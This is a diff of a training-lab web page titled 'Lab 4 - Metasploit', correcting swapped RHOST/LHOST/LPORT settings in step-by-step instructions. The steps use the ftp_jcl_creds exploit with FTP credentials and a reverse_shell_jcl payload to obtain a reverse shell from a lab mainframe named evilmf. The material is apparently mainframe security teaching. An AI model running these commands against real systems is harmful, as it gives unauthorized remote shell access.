@@ -9167,7 +9167,7 @@ Use the `--help` flag and read the documentation to accomplish
 
 </pre>
 </div>
-<div created="20181014044107306" modified="20181014051429626" tags="" title="Lab 4 - Metasploit">
+<div created="20181014044107306" modified="20181025030329337" tags="" title="Lab 4 - Metasploit">
 <pre>!!''Using Metasploit to Connect/Execute''
 * The  metasploit exploit `ftp_jcl_creds` uses the command `SITE FILE=JES` to run HLASM
 * The payload `reverse_shell_jcl` is a reverse Unix shell written in JCL and HLASM
@@ -9181,9 +9181,9 @@ Use the `--help` flag and read the documentation to accomplish
 * At `msf &gt;` prompt type: `use exploit/mainframe/ftp/ftp_jcl_creds`
 * Set the payload with `set payload cmd/mainframe/reverse_shell_jcl`
 * Change the FTP User and password: `set FTPUSER &lt;user&gt;` . and `set FTPPASS &lt;password&gt;`
-* Set ''RHOST'' to evilmf: `set lhost evilmf`
-* Set ''LHOST'' to your IP address: `set rhost &lt;vm ip address&gt;`
-* Set ''LPORT'' to 4321: `set rport 4321`
+* Set ''RHOST'' to evilmf: `set rhost evilmf`
+* Set ''LHOST'' to your IP address: `set lhost &lt;vm ip address&gt;`
+* Set ''LPORT'' to 4321: `set lport 4321`
 * Type `exploit` to launch the exploit and get a reverse shell
 
 ---
